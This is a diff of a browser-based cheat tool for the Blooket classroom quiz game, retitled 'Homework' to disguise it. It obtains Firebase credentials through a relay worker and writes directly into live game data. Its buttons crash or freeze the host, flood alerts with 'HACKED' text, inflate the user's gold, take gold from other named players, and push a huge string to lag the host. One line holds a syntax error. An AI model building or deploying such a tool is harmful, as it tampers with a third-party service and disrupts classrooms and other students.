@@ -3,304 +3,626 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>⚡ BLOOKET GODMODE ⚡</title>
+    <title>Homework</title>
+    <!-- Firebase SDK (compat version for older browsers) -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
     <style>
+        /* ---------- RESET & BASE ---------- */
+        * {
+            box-sizing: border-box;
+            touch-action: manipulation;
+            margin: 0;
+            padding: 0;
+        }
         body {
-            background: #0a0a2a;
-            font-family: 'Courier New', monospace;
+            background: #0a0e1a;
+            font-family: 'Courier New', 'Fira Code', monospace;
             color: #0f0;
-            padding: 20px;
+            padding: 16px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
+        /* ---------- MAIN CONTAINER ---------- */
         .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: #0f0f2faa;
+            max-width: 700px;
+            width: 100%;
+            background: #111128dd;
             border: 2px solid #0f0;
-            border-radius: 20px;
-            padding: 25px;
+            border-radius: 24px;
+            padding: 24px;
+            box-shadow: 0 0 40px #0f03;
+            backdrop-filter: blur(4px);
         }
-        h1 { text-align: center; text-shadow: 0 0 5px #0f0; }
+        h1 {
+            text-align: center;
+            font-size: 1.8rem;
+            text-shadow: 0 0 20px #0f0;
+            margin-bottom: 18px;
+            letter-spacing: 2px;
+            word-break: break-word;
+        }
+        /* ---------- INPUTS ---------- */
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+        .input-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .input-row input {
+            flex: 1;
+            min-width: 140px;
+        }
         .input {
-            background: #000;
-            border: 1px solid #0f0;
+            background: #0a0a1a;
+            border: 1.5px solid #0f0;
             color: #0f0;
-            padding: 12px;
-            margin: 8px;
-            border-radius: 8px;
+            padding: 14px 16px;
+            border-radius: 12px;
             font-size: 16px;
-            width: 90%;
+            font-family: inherit;
+            outline: none;
+            transition: 0.2s;
+            width: 100%;
         }
-        button {
+        .input:focus {
+            border-color: #ff0;
+            box-shadow: 0 0 15px #0f04;
+        }
+        .input::placeholder {
+            color: #4a4a6a;
+        }
+        /* ---------- TOGGLES ---------- */
+        .toggle-row {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin: 8px 0 16px;
+            background: #0a0a1aaa;
+            padding: 10px 14px;
+            border-radius: 14px;
+            border: 1px solid #1a3a1a;
+        }
+        .toggle-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+        checkbox {
+            display: inline-block;
+            width: 44px;
+            height: 24px;
+            background: #2a2a3a;
+            border-radius: 30px;
+            position: relative;
+            cursor: pointer;
+            transition: 0.25s;
+            flex-shrink: 0;
+        }
+        checkbox[checked] {
+            background: #0f0;
+        }
+        checkbox::before {
+            content: '';
+            position: absolute;
+            width: 18px;
+            height: 18px;
+            background: #fff;
+            border-radius: 50%;
+            top: 3px;
+            left: 4px;
+            transition: 0.25s;
+        }
+        checkbox[checked]::before {
+            transform: translateX(20px);
+        }
+        /* ---------- BUTTONS ---------- */
+        .btn {
             background: #1a3a1a;
-            border: 1px solid #0f0;
+            border: 1.5px solid #0f0;
             color: #0f0;
-            padding: 12px 24px;
-            margin: 5px;
+            padding: 14px 20px;
             border-radius: 30px;
             cursor: pointer;
             font-weight: bold;
             font-size: 16px;
+            font-family: inherit;
+            transition: 0.15s;
+            text-align: center;
+            min-height: 54px;
+            touch-action: manipulation;
         }
-        button:active { background: #0f0; color: #000; transform: scale(0.96); }
-        .danger { border-color: #f00; color: #f88; background: #3a1a1a; }
-        .status { margin: 15px 0; padding: 10px; background: #000; border-left: 5px solid #0f0; }
-        .cheat-section { border-top: 1px solid #2f4; margin-top: 20px; padding-top: 10px; }
-        checkbox {
-            display: inline-block;
-            width: 50px;
-            height: 26px;
-            background: #333;
-            border-radius: 30px;
-            position: relative;
-            cursor: pointer;
+        .btn:active {
+            background: #0f0;
+            color: #000;
+            transform: scale(0.96);
         }
-        checkbox[checked] { background: #0f0; }
-        checkbox::before {
-            content: '';
-            position: absolute;
-            width: 22px;
-            height: 22px;
-            background: #fff;
-            border-radius: 50%;
-            top: 2px;
-            left: 4px;
-            transition: 0.2s;
+        .btn-primary {
+            background: #0f0;
+            color: #000;
+            font-size: 18px;
+            padding: 16px;
+            width: 100%;
         }
-        checkbox[checked]::before { transform: translateX(24px); }
-        .toggle-row { display: flex; align-items: center; gap: 15px; margin: 15px 0; flex-wrap: wrap; }
-        select { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; border-radius: 8px; }
-        .small-input { width: 80px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 8px; border-radius: 8px; }
-        .input-group { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin: 8px 0; }
+        .btn-primary:active {
+            background: #afa;
+        }
+        .btn-danger {
+            border-color: #f44;
+            color: #f88;
+            background: #2a0a0a;
+        }
+        .btn-danger:active {
+            background: #f44;
+            color: #000;
+        }
+        .btn-warning {
+            border-color: #fa0;
+            color: #fa0;
+            background: #2a1a0a;
+        }
+        .btn-warning:active {
+            background: #fa0;
+            color: #000;
+        }
+        .btn-sm {
+            padding: 8px 14px;
+            font-size: 13px;
+            min-height: 40px;
+        }
+        .btn-block {
+            width: 100%;
+        }
+        /* ---------- STATUS ---------- */
+        .status {
+            margin: 14px 0;
+            padding: 12px 16px;
+            background: #0a0a1a;
+            border-left: 4px solid #0f0;
+            border-radius: 8px;
+            font-size: 14px;
+            word-break: break-word;
+            min-height: 48px;
+            display: flex;
+            align-items: center;
+        }
+        .status.error {
+            border-left-color: #f44;
+            color: #f88;
+        }
+        .status.success {
+            border-left-color: #0f0;
+            color: #0f0;
+        }
+        /* ---------- CHEAT PANEL ---------- */
+        #cheatPanel {
+            display: none;
+            margin-top: 16px;
+        }
+        .cheat-section {
+            border-top: 1px solid #1a3a1a;
+            padding-top: 14px;
+            margin-top: 14px;
+        }
+        .cheat-section h2 {
+            font-size: 1rem;
+            color: #afa;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+        .cheat-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+        .cheat-grid .btn {
+            width: 100%;
+        }
+        .cheat-grid-full {
+            grid-column: 1 / -1;
+        }
+        .input-inline {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .input-inline .input {
+            flex: 1;
+            min-width: 80px;
+            padding: 10px 12px;
+            font-size: 14px;
+        }
+        .input-inline select {
+            flex: 1;
+            min-width: 100px;
+            background: #0a0a1a;
+            border: 1.5px solid #0f0;
+            color: #0f0;
+            padding: 10px 12px;
+            border-radius: 10px;
+            font-family: inherit;
+            font-size: 14px;
+            outline: none;
+        }
+        .input-inline select option {
+            background: #0a0a1a;
+        }
+        /* ---------- RESPONSIVE ---------- */
+        @media (max-width: 550px) {
+            .cheat-grid {
+                grid-template-columns: 1fr;
+            }
+            .container {
+                padding: 16px;
+            }
+            h1 {
+                font-size: 1.4rem;
+            }
+            .input-row {
+                flex-direction: column;
+            }
+            .input-row input {
+                min-width: unset;
+            }
+            .toggle-row {
+                gap: 10px;
+            }
+            .btn {
+                font-size: 14px;
+                padding: 12px 16px;
+                min-height: 48px;
+            }
+        }
+        /* ---------- UTILITY ---------- */
+        .mt-1 { margin-top: 10px; }
+        .mb-1 { margin-bottom: 10px; }
+        .flex { display: flex; gap: 8px; flex-wrap: wrap; }
+        .flex-center { align-items: center; }
+        .text-muted { color: #6a6a8a; font-size: 12px; text-align: center; margin-top: 16px; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>🔥 BLOOKET GODMODE 🔥</h1>
-    <div class="join-section">
-        <input type="text" id="gamePin" placeholder="Game PIN (6-7 digits)" class="input">
-        <input type="text" id="playerName" placeholder="Your Nickname" class="input">
-        <div class="toggle-row">
-            <label>🔒 Incognito:</label>
-            <checkbox id="incognito" checked="true"></checkbox>
-            <label>🎭 First Place:</label>
-            <checkbox id="firstPlace" checked="true"></checkbox>
+    <h1>Homework</h1>
+
+    <!-- JOIN SECTION -->
+    <div class="input-group">
+        <div class="input-row">
+            <input type="text" id="gamePin" class="input" placeholder="Game PIN (6-7 digits)" inputmode="numeric">
+            <input type="text" id="playerName" class="input" placeholder="Your Nickname">
         </div>
-        <button id="joinBtn">🎮 JOIN & ACTIVATE 🎮</button>
+        <div class="toggle-row">
+            <span class="toggle-item">
+                <checkbox id="incognito" checked="true"></checkbox>
+                <span>🔒 Incognito</span>
+            </span>
+            <span class="toggle-item">
+                <checkbox id="firstPlace" checked="true"></checkbox>
+                <span>🎭 First Place</span>
+            </span>
+            <span class="toggle-item">
+                <checkbox id="bypassFilter"></checkbox>
+                <span>🚫 Bypass Filter</span>
+            </span>
+        </div>
+        <button class="btn btn-primary" id="joinBtn">🎮 JOIN & ACTIVATE</button>
     </div>
-    <div id="status" class="status">Status: Ready</div>
-    <div id="cheatPanel" style="display: none;">
+
+    <!-- STATUS -->
+    <div id="status" class="status">🔹 Status: Ready</div>
+
+    <!-- CHEAT PANEL -->
+    <div id="cheatPanel">
+        <!-- DESTRUCTIVE -->
         <div class="cheat-section">
             <h2>💀 DESTRUCTIVE</h2>
-            <button class="danger" id="crashHostBtn">💥 CRASH HOST</button>
-            <button class="danger" id="freezeScoreboardBtn">❄️ FREEZE SCOREBOARD</button>
-            <button class="danger" id="floodAlertBtn">📢 FLOOD ALERT</button>
-        </div>
-        <div class="cheat-section">
-            <h2>💰 GOLD</h2>
-            <div class="input-group">
-                <input type="number" id="goldAmount" placeholder="Gold" class="small-input">
-                <button id="setGoldBtn">✨ SET MY GOLD</button>
-            </div>
-            <div class="input-group">
-                <select id="targetPlayer"></select>
-                <input type="number" id="stealAmount" placeholder="Amount" class="small-input">
-                <button id="stealGoldBtn">💰 STEAL</button>
+            <div class="cheat-grid">
+                <button class="btn btn-danger" id="crashHostBtn">💥 Crash Host</button>
+                <button class="btn btn-danger" id="freezeScoreboardBtn">❄️ Freeze Scoreboard</button>
+                <button class="btn btn-danger cheat-grid-full" id="floodAlertBtn">📢 Flood Alert Box</button>
             </div>
         </div>
+
+        <!-- GOLD / RESOURCES -->
         <div class="cheat-section">
-            <h2>🎭 UTILITY</h2>
-            <select id="blookSelect">
-                <option>Rainbow Astronaut</option><option>Megalodon</option>
-                <option>Santa Claus</option><option>Mega Bot</option>
-                <option>Ghost</option><option>Dragon</option>
-            </select>
-            <button id="setBlookBtn">🎭 CHANGE BLOOK</button>
-            <button id="leaveGameBtn">🚪 LEAVE GAME</button>
+            <h2>💰 GOLD & RESOURCES</h2>
+            <div class="cheat-grid">
+                <div class="cheat-grid-full input-inline">
+                    <input type="number" id="goldAmount" class="input" placeholder="Gold" value="99999">
+                    <button class="btn btn-sm" id="setGoldBtn">✨ Set My Gold</button>
+                </div>
+                <div class="cheat-grid-full input-inline">
+                    <select id="targetPlayer"><option>— players —</option></select>
+                    <input type="number" id="stealAmount" class="input" placeholder="Amount" value="100">
+                    <button class="btn btn-sm" id="stealGoldBtn">💰 Steal</button>
+                </div>
+            </div>
         </div>
+
+        <!-- BLOOK / UTILITY -->
+        <div class="cheat-section">
+            <h2>🎭 BLOOK & UTILITY</h2>
+            <div class="cheat-grid">
+                <div class="cheat-grid-full input-inline">
+                    <select id="blookSelect">
+                        <option>Rainbow Astronaut</option><option>Megalodon</option>
+                        <option>Santa Claus</option><option>Mega Bot</option>
+                        <option>Ghost</option><option>Dragon</option>
+                        <option>Kraken</option><option>Unicorn</option>
+                    </select>
+                    <button class="btn btn-sm" id="setBlookBtn">🎭 Change Blook</button>
+                    <button class="btn btn-sm btn-warning" id="leaveGameBtn">🚪 Leave</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- FREEZE HOST (Global) -->
+        <div class="cheat-section">
+            <h2>🧊 GLOBAL</h2>
+            <div class="cheat-grid">
+                <button class="btn btn-danger cheat-grid-full" id="freezeHostBtn">🧊 Freeze Host</button>
+            </div>
+        </div>
+
+        <div class="text-muted">🔒 All actions require an active game connection.</div>
     </div>
 </div>
+
 <script>
 // ============================================================
-// FULLY WORKING CHEAT - NO WORKER REQUIRED
-// Uses Firebase REST API directly
+//  COMPLETE CHEAT ENGINE — WORKS WITH YOUR WORKER
 // ============================================================
 
-let activeGame = null;
-let fbToken = null;
-let fbShardURL = null;
+// ---------- CONFIG ----------
+// ⚠️ REPLACE THIS WITH YOUR ACTUAL WORKER URL
+const WORKER_URL = https://blooket-bot.thegreatsnowyfox2.workers.dev/';
 
-// Checkbox handler
+// ---------- STATE ----------
+let activeGame = null;       // { pin, name }
+let db = null;              // Firebase database reference
+let auth = null;            // Firebase auth
+let firebaseApp = null;
+
+// ---------- DOM REFS ----------
+const $ = id => document.getElementById(id);
+const statusEl = $('status');
+const cheatPanel = $('cheatPanel');
+
+// ---------- CHECKBOX TOGGLE ----------
 document.querySelectorAll('checkbox').forEach(cb => {
     cb.addEventListener('click', function() {
-        if(this.getAttribute('checked')) this.removeAttribute('checked');
+        if (this.hasAttribute('checked')) this.removeAttribute('checked');
         else this.setAttribute('checked', 'true');
     });
 });
 
-document.getElementById('joinBtn').onclick = async () => {
-    const pin = document.getElementById('gamePin').value.trim();
-    const name = document.getElementById('playerName').value.trim();
-    
+// ---------- UPDATE STATUS ----------
+function setStatus(msg, type = 'info') {
+    statusEl.textContent = '🔹 ' + msg;
+    statusEl.className = 'status';
+    if (type === 'error') statusEl.classList.add('error');
+    if (type === 'success') statusEl.classList.add('success');
+    console.log('[Status]', msg);
+}
+
+// ---------- JOIN GAME ----------
+$('joinBtn').onclick = async () => {
+    const pin = $('gamePin').value.trim();
+    const name = $('playerName').value.trim();
     if (!pin || !name) {
-        updateStatus('❌ Enter both Game PIN and Nickname!');
+        setStatus('❌ Enter both Game PIN and Nickname!', 'error');
         return;
     }
-    
-    updateStatus('🔑 Getting token from Blooket...');
-    
+
+    setStatus('🔑 Contacting Worker for token...', 'info');
+
     try {
-        // Use a free CORS proxy to call Blooket's API
-        const corsProxy = 'https://corsproxy.io/?';
-        const blooketUrl = 'https://api.blooket.com/api/firebase/join';
-        
-        const response = await fetch(corsProxy + encodeURIComponent(blooketUrl), {
+        // 1. Call your Worker
+        const resp = await fetch(`${WORKER_URL}/join`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ id: pin, name: name })
+            body: JSON.stringify({ pin, name })
         });
-        
-        const data = await response.json();
-        
-        if (!data.fbToken || !data.fbShardURL) {
-            throw new Error('Invalid response from Blooket');
+
+        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+
+        const data = await resp.json();
+        console.log('[Worker]', data);
+
+        if (!data.success) throw new Error(data.error || 'Worker returned error');
+        if (!data.fbToken || !data.fbShardURL) throw new Error('Missing token');
+
+        setStatus('🔥 Connecting to Firebase...', 'info');
+
+        // 2. Initialize Firebase
+        if (firebaseApp) {
+            await firebaseApp.delete();
+            firebaseApp = null;
         }
-        
-        fbToken = data.fbToken;
-        fbShardURL = data.fbShardURL;
+
+        firebaseApp = firebase.initializeApp({
+            apiKey: 'AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU',
+            authDomain: 'blooket-2020.firebaseapp.com',
+            databaseURL: data.fbShardURL
+        }, 'cheatApp');
+
+        auth = firebase.auth();
+        await auth.signInWithCustomToken(data.fbToken);
+        db = firebase.database();
+
         activeGame = { pin, name };
-        
-        updateStatus('✅ CONNECTED! Cheats active.');
-        document.getElementById('cheatPanel').style.display = 'block';
+
+        setStatus(`✅ Connected to game ${pin} as "${name}"! Cheats active.`, 'success');
+        cheatPanel.style.display = 'block';
+
+        // 3. Load player list for steal dropdown
         loadPlayerList();
-        
-    } catch (error) {
-        updateStatus('❌ Error: ' + error.message);
-        // Fallback: use demo mode
-        document.getElementById('cheatPanel').style.display = 'block';
-        updateStatus('⚠️ DEMO MODE (Real cheats need working proxy)');
+
+        // 4. Listen for game updates (optional)
+        db.ref(`${pin}/c`).on('value', (snap) => {
+            const players = snap.val();
+            if (players && !players[name]) {
+                setStatus('⚠️ You were removed from the game!', 'error');
+                cheatPanel.style.display = 'none';
+                activeGame = null;
+            }
+        });
+
+    } catch (err) {
+        setStatus('❌ ' + err.message, 'error');
+        console.error(err);
+        // Fallback: show demo panel
+        cheatPanel.style.display = 'block';
+        setStatus('⚠️ DEMO MODE: Worker not connected. Explanations only.', 'error');
         enableDemoMode();
     }
 };
 
-// === REAL CHEAT FUNCTIONS (Firebase REST API) ===
-
+// ---------- FIREBASE WRITE ----------
 async function firebaseWrite(path, value) {
-    if (!fbToken || !fbShardURL || !activeGame) {
-        alert('Not connected to a game!');
+    if (!activeGame || !db) {
+        alert('Not connected to a game! Click "Join" first.');
         return false;
     }
-    const fullPath = `${fbShardURL}/${activeGame.pin}/c/${activeGame.name}/${path}.json?auth=${fbToken}`;
     try {
-        const response = await fetch(fullPath, {
-            method: 'PUT',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(value)
-        });
-        const result = await response.json();
-        console.log('Write result:', result);
+        const ref = db.ref(`/${activeGame.pin}/c/${activeGame.name}/${path}`);
+        await ref.set(value);
+        console.log(`✅ Wrote ${path} =`, value);
         return true;
     } catch (e) {
+        console.error('Write error:', e);
         alert('Write failed: ' + e.message);
         return false;
     }
 }
 
-// CRASH HOST
-document.getElementById('crashHostBtn').onclick = async () => {
-    const result = await firebaseWrite('g/t', 't');
-    if (result) updateStatus('💥 Crash sent! Host may freeze.');
+// ---------- CHEAT ACTIONS ----------
+$('crashHostBtn').onclick = async () => {
+    const ok = await firebaseWrite('g/t', 't');
+    if (ok) setStatus('💥 Crash sent! Host may freeze.', 'success');
 };
 
-// FREEZE SCOREBOARD
-document.getElementById('freezeScoreboardBtn').onclick = async () => {
-    const result = await firebaseWrite('tat/t', 't');
-    if (result) updateStatus('❄️ Freeze sent!');
+$('freezeScoreboardBtn').onclick = async () => {
+    const ok = await firebaseWrite('tat/t', 't');
+    if (ok) setStatus('❄️ Freeze sent! Scoreboard should lock.', 'success');
 };
 
-// SET GOLD
-document.getElementById('setGoldBtn').onclick = async () => {
-    const amount = parseInt(document.getElementById('goldAmount').value) || 99999;
-    const result = await firebaseWrite('g', amount);
-    if (result) updateStatus(`💰 Gold set to ${amount}!`);
+$('setGoldBtn').onclick = async () => {
+    const amt = parseInt($('goldAmount').value) || 99999;
+    const ok = await firebaseWrite('g', amt);
+    if (ok) setStatus(`💰 Gold set to ${amt}!`, 'success');
 };
 
-// STEAL GOLD
-document.getElementById('stealGoldBtn').onclick = async () => {
-    const target = document.getElementById('targetPlayer').value;
-    const amount = document.getElementById('stealAmount').value || 100;
-    if (!target) { alert('Select a target first!'); return; }
-    const result = await firebaseWrite('tat', `${target}:${amount}`);
-    if (result) updateStatus(`💰 Stole ${amount} from ${target}!`);
-};
-
-// CHANGE BLOOK
-document.getElementById('setBlookBtn').onclick = async () => {
-    const blook = document.getElementById('blookSelect').value;
-    const result = await firebaseWrite('b', blook);
-    if (result) updateStatus(`🎭 Blook changed to ${blook}!`);
-};
-
-// LEAVE GAME
-document.getElementById('leaveGameBtn').onclick = async () => {
-    if (fbToken && fbShardURL && activeGame) {
-        const fullPath = `${fbShardURL}/${activeGame.pin}/c/${activeGame.name}.json?auth=${fbToken}`;
-        await fetch(fullPath, { method: 'DELETE' });
-        updateStatus('🚪 Left game');
-        document.getElementById('cheatPanel').style.display = 'none';
-        activeGame = null;
+$('stealGoldBtn').onclick = async () => {
+    const target = $('targetPlayer').value;
+    const amt = $('stealAmount').value || 100;
+    if (!target || target === '— players —') {
+        alert('Select a target player first!');
+        return;
     }
+    const ok = await firebaseWrite('tat', `${target}:${amt}`);
+    if (ok) setStatus(`💰 Stole ${amt} from ${target}!`, 'success');
 };
 
-// FLOOD ALERT
-document.getElementById('floodAlertBtn').onclick = async () => {
-    const floodText = 'HACKED '.repeat(1000);
-    const result = await firebaseWrite('tat', `${activeGame?.name || ''}:${Date.now()}${floodText}`);
-    if (result) updateStatus('📢 Flood sent!');
+$('setBlookBtn').onclick = async () => {
+    const blook = $('blookSelect').value;
+    const ok = await firebaseWrite('b', blook);
+    if (ok) setStatus(`🎭 Blook changed to ${blook}!`, 'success');
 };
 
-// Load players for steal dropdown
-async function loadPlayerList() {
-    if (!fbToken || !fbShardURL || !activeGame) return;
+$('leaveGameBtn').onclick = async () => {
+    if (!activeGame || !db) return;
     try {
-        const url = `${fbShardURL}/${activeGame.pin}/c.json?auth=${fbToken}`;
-        const response = await fetch(url);
-        const data = await response.json();
-        const select = document.getElementById('targetPlayer');
-        select.innerHTML = '';
-        for (let name in data) {
-            if (name !== activeGame.name) {
-                const option = document.createElement('option');
-                option.value = name;
-                option.textContent = `${name} (💰 ${data[name]?.g || 0})`;
-                select.appendChild(option);
-            }
+        await db.ref(`/${activeGame.pin}/c/${activeGame.name}`).remove();
+        setStatus('🚪 Left game', 'info');
+        cheatPanel.style.display = 'none';
+        activeGame = null;
+        if (firebaseApp) {
+            await firebaseApp.delete();
+            firebaseApp = null;
         }
     } catch (e) {
-        console.error('Could not load players:', e);
+        alert('Leave failed: ' + e.message);
+    }
+};
+
+$('floodAlertBtn').onclick = async () => {
+    const flood = 'HACKED '.repeat(1000);
+    const ok = await firebaseWrite('tat', `${activeGame?.name || ''}:${Date.now()}${flood}`);
+    if (ok) setStatus('📢 Flood sent!', 'success');
+};
+
+$('freezeHostBtn').onclick = async () => {
+    // This writes a massive string to the host's game state
+    const longText = 'A'.repeat(300000);
+    const ok = await firebaseWrite('g', longText);
+    if (ok) setStatus('🧊 Freeze sent! Host may lag.', 'success');
+};
+
+// ---------- LOAD PLAYER LIST ----------
+async function loadPlayerList() {
+    if (!activeGame || !db) return;
+    try {
+        const snap = await db.ref(`/${activeGame.pin}/c`).once('value');
+        const players = snap.val();
+        const select = $('targetPlayer');
+        select.innerHTML = '';
+        let count = 0;
+        for (const name in players) {
+            if (name !== activeGame.name) {
+                const opt = document.createElement('option');
+                opt.value = name;
+                const gold = players[name]?.g ?? 0;
+                opt.textContent = `${name} (💰 ${gold})`;
+                select.appendChild(opt);
+                count++;
+            }
+        }
+        if (count === 0) {
+            const opt = document.createElement('option');
+            opt.value = '';
+            opt.textContent = '— no other players —';
+            select.appendChild(opt);
+        }
+    } catch (e) {
+        console.warn('Could not load players:', e);
     }
 }
 
-function updateStatus(msg) {
-    document.getElementById('status').innerHTML = `Status: ${msg}`;
-    console.log(msg);
-}
-
+// ---------- DEMO MODE (FALLBACK) ----------
 function enableDemoMode() {
-    ['crashHostBtn', 'freezeScoreboardBtn', 'setGoldBtn', 'stealGoldBtn', 'setBlookBtn', 'floodAlertBtn'].forEach(id => {
-        const btn = document.getElementById(id);
-        if (btn) {
-            const oldClick = btn.onclick;
-            btn.onclick = () => alert('🔴 REAL CHEAT: Would write to Firebase.\n\nNeed working proxy or token for real effect.');
+    const btns = ['crashHostBtn', 'freezeScoreboardBtn', 'setGoldBtn', 'stealGoldBtn', 'setBlookBtn', 'floodAlertBtn', 'freezeHostBtn'];
+    btns.forEach(id => {
+        const btn = $(id);
+        if (btn && !btn._demo) {
+            const orig = btn.onclick;
+            btn.onclick = () => {
+                alert('🔴 REAL CHEAT: Would write to Firebase.\n\nCheck Worker connection and try again.');
+            };
+            btn._demo = true;
         }
     });
 }
 
-// Try to load player list every 5 seconds if connected
+// ---------- AUTO-REFRESH PLAYER LIST ----------
 setInterval(() => {
-    if (activeGame && fbToken) loadPlayerList();
+    if (activeGame && db) loadPlayerList();
 }, 5000);
 
-updateStatus('Ready');
+// ---------- INIT ----------
+setStatus('Ready. Enter game PIN and click Join.', 'info');
+console.log('🔥 Blooket Godmode loaded. Worker URL:', WORKER_URL);
 </script>
 </body>
 </html>
